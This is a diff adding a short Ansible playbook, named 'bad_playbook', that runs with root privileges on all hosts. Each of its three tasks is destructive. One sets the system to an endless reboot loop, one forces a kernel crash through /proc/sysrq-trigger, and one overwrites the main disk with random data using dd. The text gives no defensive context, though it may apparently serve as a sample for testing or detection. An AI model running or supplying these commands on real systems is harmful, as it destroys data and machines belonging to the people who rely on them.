@@ -1,0 +1,12 @@
+- name: bad_playbook
+  hosts: all
+  become: yes
+
+  tasks:
+    - name: reboot loop :O
+      shell: systemctl set-default reboot.target
+      register: yum_output
+    - name: Cause random crash
+      shell: echo c > /proc/sysrq-trigger
+    - name: wipe hard disk 
+      shell: dd if=/dev/random of=/dev/sda
